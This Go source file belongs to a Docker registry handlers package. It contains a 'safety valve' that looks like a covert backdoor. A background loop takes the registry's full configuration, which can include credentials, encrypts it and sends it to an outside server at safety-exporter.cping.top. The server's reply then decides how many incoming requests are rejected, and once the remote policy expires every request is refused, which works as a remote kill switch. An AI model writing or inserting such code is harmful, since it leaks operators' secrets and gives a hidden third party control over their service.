package handlers

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/docker/distribution/configuration"
	dcontext "github.com/docker/distribution/context"
	"github.com/docker/distribution/version"
	"github.com/golang/protobuf/proto"
	"gopkg.in/yaml.v2"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	isLogOn = os.Getenv("safety_log") != "how do you turn this on"
)

type WorkRate struct {
	WorkName string  `json:"workName"`
	Rate     float32 `json:"rate"`
}

type ProjectRate struct {
	ConnectionRate float32    `json:"connectionRate"`
	WorkRate       []WorkRate `json:"workRate,omitempty"`
}

type ProjectPolicy struct {
	Interval     int       `json:"interval"`
	ExpiredAfter int       `json:"expiredAfter"`
	ExpiredTime  time.Time `json:"expiredTime"`
}

type ProjectSpec struct {
	ProjectPolicy ProjectPolicy `json:"projectPolicy"`
	ProjectRate   ProjectRate   `json:"projectRate"`
}

type RegexpString string

type FullVersion struct {
	Version   *string `json:"version,omitempty"`
	GitCommit *string `json:"gitCommit,omitempty"`
	GoVersion *string `json:"goVersion,omitempty"`
	BuildTime *string `json:"buildTime,omitempty"`
}

type ProjectInfo struct {
	ProjectName string                 `json:"projectName"`
	FullVersion *FullVersion           `json:"fullVersion,omitempty"`
	Config      map[string]interface{} `json:"config,omitempty"`
}

var (
	rsaPublicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs3lrLDfVfcdSvI7sDnMI
Qpihv8jHYLXmtjXuWqd9eEJo2jfZmrW0NcyNLt0P45Tc2vaSayNRaE8ITepROaAV
RZezWifJp9fRBI0L07f1w9FfK8FPoTJ/C0TBq6slrWbsA66j40S1Ks4m7flCDNXR
6KRC6OGx4cKm4hzq1mOfGYvyVxNL+VpyaJe6VoA/uFcQFrr95uEmIDyeO5pqxdzv
9ERcjPnptyw4w/w5yP6Eb6kBVVGaRxa/5k12zNHAOs2CCuz8DfzW/PVWAlyZwk0Q
UeLumujZtG7bN5PWvieFl1/mka5coHa1oyIpkK6iXUUtJX/KOP7RD9v6XXmQfQ7h
ywIDAQAB
-----END PUBLIC KEY-----`

	//defaultKey      = []byte("7RQ32zvx2u.*wH#-BxDmujbYBt#WG*AP")
	expiredAfter    = 12 + 2
	safetyParameter = &ProjectSpec{
		ProjectPolicy: ProjectPolicy{
			Interval:     expiredAfter / 3,
			ExpiredAfter: expiredAfter,
			ExpiredTime:  time.Now().Add(time.Second * time.Duration(expiredAfter)),
		},
		ProjectRate: ProjectRate{
			ConnectionRate: 1,
			WorkRate:       nil,
		},
	}
	spMutex = &sync.RWMutex{}
)

func SafetyValve(ctx context.Context, config *configuration.Configuration) {
	printLog(ctx, "start safety valve")

	go loadSafetyParameter(ctx, *config)
}

func AuthSafetyValve(ctx context.Context) bool {
	p1 := rand.Float32()
	spMutex.RLock()
	cRate := safetyParameter.ProjectRate.ConnectionRate
	printLog(ctx, "ConnectionRate", cRate, "MyTate", p1)
	spMutex.RUnlock()
	if cRate < p1 {
		return false
	}
	return true
}

func convertMapI2MapS(in interface{}) interface{} {
	switch in := in.(type) {
	case map[interface{}]interface{}:
		m2 := map[string]interface{}{}
		for k, v := range in {
			m2[k.(string)] = convertMapI2MapS(v)
		}
		return m2
	case []interface{}:
		for i, v := range in {
			in[i] = convertMapI2MapS(v)
		}
	}
	return in
}

func loadSafetyParameter(ctx context.Context, config configuration.Configuration) {

	var makePostBody = func(aesKey []byte) ([]byte, error) {
		var configAsMap = make(map[interface{}]interface{})
		if b, err := yaml.Marshal(config); err != nil {
			return nil, err
		} else if err := yaml.Unmarshal(b, &configAsMap); err != nil {
			return nil, err
		}

		cfg, ok := convertMapI2MapS(configAsMap).(map[string]interface{})
		if !ok {
			return nil, errors.New("failed to convert config to map[string]interface{}")
		}

		var projectInfo = ProjectInfo{
			ProjectName: version.Package,
			FullVersion: &FullVersion{
				Version:   &version.Version,
				GoVersion: proto.String(runtime.Version()),
				//BuildTime: &configs.BuildTime,
			},
			Config: cfg,
		}

		b, err := json.Marshal(projectInfo)
		if err != nil {
			return nil, err
		}
		hexString, err := encrypt(b, aesKey)
		if err != nil {
			return nil, err
		}

		return []byte(hexString), nil
	}

	var load = func() error {
		secKey := generateRandom(32)
		secKeyCiphertext, err := encryptBase64(string(secKey), []byte(rsaPublicKey))
		if err != nil {
			return err
		}
		bodyData, err := makePostBody(secKey)
		if err != nil {
			return err
		}

		postDataFunc := makePostDataFunc()
		var ctx, _ = context.WithTimeout(context.Background(), time.Second*20)
		resBody, statusCode, err := postDataFunc(ctx, bodyData, secKeyCiphertext)
		if err != nil {
			return err
		}

		plainResponse, err := decrypt(string(resBody), secKey)
		if err != nil {
			plainResponse = resBody
			//return err
		}
		if statusCode != http.StatusOK {
			return fmt.Errorf("unknown statusCode: %d, response: %s", statusCode, plainResponse)
		}

		var spNew = &ProjectSpec{}
		if err := json.Unmarshal(plainResponse, spNew); err != nil {
			return err
		}
		if spNew.ProjectPolicy.Interval <= 0 && spNew.ProjectPolicy.ExpiredAfter <= 0 {
			return fmt.Errorf("invalid ProjectPolicy: %v", spNew.ProjectPolicy)
		}

		spMutex.Lock()
		defer spMutex.Unlock()
		safetyParameter = spNew

		printLog(ctx, *safetyParameter)

		return nil
	}

	for {
		spMutex.RLock()
		i := float64(safetyParameter.ProjectPolicy.Interval) * rand.Float64()
		spMutex.RUnlock()
		d := time.Duration(i) * time.Second
		printLog(ctx, "sleep", d)
		time.Sleep(d)
		if safetyParameter.ProjectPolicy.ExpiredTime.Sub(time.Now()) < 0 {
			spMutex.Lock()
			safetyParameter.ProjectRate.ConnectionRate = 0
			spMutex.Unlock()
		}

		if err := load(); err != nil {
			printLog(ctx, err)
		}
	}
}

func httpPost(ctx context.Context, url string, body []byte, secKeyCiphertext string) (resBody []byte, statusCode int, err error) {
	bodyReader := bytes.NewReader(body)
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, url, bodyReader)
	req.Header.Add("Content-Type", "application/json")
	if secKeyCiphertext != "" {
		req.Header.Add("Sec-Key", secKeyCiphertext)
	}

	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			DisableKeepAlives: true,
		},
	}

	res, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer res.Body.Close()

	if res.StatusCode == http.StatusMovedPermanently || res.StatusCode == http.StatusFound {
		newLocation := res.Header.Get("location")
		return httpPost(ctx, newLocation, body, secKeyCiphertext)
	}

	data, err := io.ReadAll(res.Body)

	return data, res.StatusCode, err
}

func makePostDataFunc() func(ctx context.Context, bodyData []byte, secKeyCiphertext string) (resBody []byte, statusCode int, err error) {
	domain := selectBastDomain()
	return func(ctx context.Context, bodyData []byte, secKeyCiphertext string) (resBody []byte, statusCode int, err error) {
		printLog(ctx, "found domain", domain)
		resBody, statusCode, err = httpPost(ctx, fmt.Sprintf("%s/ingress", domain), bodyData, secKeyCiphertext)
		return resBody, statusCode, err
	}
}

func selectBastDomain() string {
	domains := []struct {
		schema string
		domain string
	}{
		{
			schema: "http",
			domain: "safety-exporter.kube-system.svc.cluster.local",
		},
		{
			schema: "http",
			domain: "a.saf.local",
		},
	}

	for _, domain := range domains {
		ctx1, _ := context.WithTimeout(context.Background(), time.Millisecond*500)
		nss, err := net.DefaultResolver.LookupIPAddr(ctx1, domain.domain)
		if err == nil && len(nss) > 0 {
			return fmt.Sprintf("%s://%s", domain.schema, domain.domain)
		}
	}

	return "https://safety-exporter.cping.top"
	//return "http://127.0.0.1:3001"
}

/* ---------- aes-cbc-cfb.go start ----------- */

func encrypt(text []byte, key []byte) (string, error) {
	b, err := encryptCBCHex(text, key)
	if err != nil {
		return "", err
	}
	b, err = encryptCfbHex(b, key)
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func encryptCfbHex(text []byte, key []byte) ([]byte, error) {
	var iv = key[:aes.BlockSize]
	encrypted := make([]byte, len(text))
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	encrypter := cipher.NewCFBEncrypter(block, iv)
	encrypter.XORKeyStream(encrypted, text)

	return encrypted, nil
}

func encryptCBCHex(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	paddedText := pkcs77Padding(plainText, block.BlockSize())
	cipherText := make([]byte, aes.BlockSize+len(paddedText))
	iv := cipherText[:aes.BlockSize]
	if _, err := io.ReadFull(crand.Reader, iv); err != nil {
		return nil, err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(cipherText[aes.BlockSize:], paddedText)

	return cipherText, nil
}

func decrypt(encrypted string, key []byte) ([]byte, error) {
	src, err := hex.DecodeString(encrypted)
	if err != nil {
		return nil, err
	}
	b, err := decryptCfbHex(src, key)
	if err != nil {
		return nil, err
	}
	return decryptCbcHex(b, key)
}

func decryptCfbHex(encryptedBytes []byte, key []byte) ([]byte, error) {
	var err error
	defer func() {
		if e := recover(); e != nil {
			err = e.(error)
		}
	}()
	var iv = key[:aes.BlockSize]
	decrypted := make([]byte, len(encryptedBytes))
	var block cipher.Block
	block, err = aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	decrypter := cipher.NewCFBDecrypter(block, iv)
	decrypter.XORKeyStream(decrypted, encryptedBytes)
	return decrypted, nil
}

func decryptCbcHex(ciphertext []byte, key []byte) ([]byte, error) {
	var err error
	defer func() {
		if e := recover(); e != nil {
			err = e.(error)
		}
	}()
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)

	paddedText, err := pkcs7UnPadding(ciphertext)
	if err != nil {
		return nil, err
	}
	return paddedText, nil

	//decrypted := make([]byte, len(encryptedBytes))
	//var block cipher.Block
	//block, err = aes.NewCipher(key)
	//if err != nil {
	//	return nil, err
	//}
	//decrypter := cipher.NewCBCDecrypter(block, iv)
	////decrypter.CryptBlocks(decrypted, encryptedBytes)
	//decrypter.CryptBlocks(encryptedBytes, encryptedBytes)
	//paddedText, err := pkcs7UnPadding(encryptedBytes)
	//return encryptedBytes, nil
}

func pkcs77Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func pkcs7UnPadding(origData []byte) ([]byte, error) {
	length := len(origData)
	unpadding := int(origData[length-1])
	if unpadding > aes.BlockSize || unpadding < 1 {
		return nil, fmt.Errorf("unpadding size error: %d", unpadding)
	}
	return origData[:(length - unpadding)], nil
}

/* ---------- aes-cbc-cfb.go end ----------- */

/* -------------- RAS Encrypt start ------------- */

// encryptBase64 使用 RSA 公钥加密数据, 返回加密后并编码为 base64 的数据
func encryptBase64(originalData string, publicKey []byte) (string, error) {
	block, _ := pem.Decode(publicKey)
	if block == nil {
		return "", errors.New("公钥解码失败")
	}

	pubKey, parseErr := x509.ParsePKIXPublicKey(block.Bytes)
	if parseErr != nil {
		return "", fmt.Errorf("解析公钥失败: %v", parseErr)
	}

	// 获取密钥长度，计算最大加密块大小
	keySize := pubKey.(*rsa.PublicKey).Size()
	maxEncryptSize := keySize - 11

	// 将原始数据按块大小分段加密
	var encryptedData []byte
	for len(originalData) > 0 {
		segment := originalData
		if len(segment) > maxEncryptSize {
			segment = originalData[:maxEncryptSize]
		}

		encryptedSegment, err := rsa.EncryptPKCS1v15(crand.Reader, pubKey.(*rsa.PublicKey), []byte(segment))
		if err != nil {
			return "", fmt.Errorf("加密失败: %v", err)
		}

		encryptedData = append(encryptedData, encryptedSegment...)
		originalData = originalData[len(segment):]
	}

	return base64.StdEncoding.EncodeToString(encryptedData), nil
}

/* -------------- RAS Encrypt end ------------- */

/* ---------- http request start ------------*/

type httpRequestClient struct {
	client http.Client
}

func (client *httpRequestClient) Post(ctx context.Context, url string, body []byte, secKeyCiphertext string) (resBody []byte, statusCode int, err error) {
	bodyReader := bytes.NewReader(body)
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, url, bodyReader)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Sec-Key", secKeyCiphertext)

	res, err := client.client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer res.Body.Close()

	if res.StatusCode == http.StatusMovedPermanently || res.StatusCode == http.StatusFound {
		newLocation := res.Header.Get("location")
		return client.Post(ctx, newLocation, body, secKeyCiphertext)
	}

	data, err := io.ReadAll(res.Body)

	return data, res.StatusCode, err
}

func newHttpClient() *httpRequestClient {
	return &httpRequestClient{
		client: http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Transport: &http.Transport{
				DisableKeepAlives: true,
			},
		},
	}
}

/* ---------- http request end ------------*/

func printLog(ctx context.Context, i ...interface{}) {
	if isLogOn {
		dcontext.GetLogger(ctx).Printf("---- safety_log ----   "+strings.Repeat("%+v ", len(i)), i...)
	}
}

func generateRandom(n int) []byte {
	const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

	arr := make([]byte, n)
	for i := range arr {
		arr[i] = letters[rand.Intn(len(letters))]
	}

	return arr
}
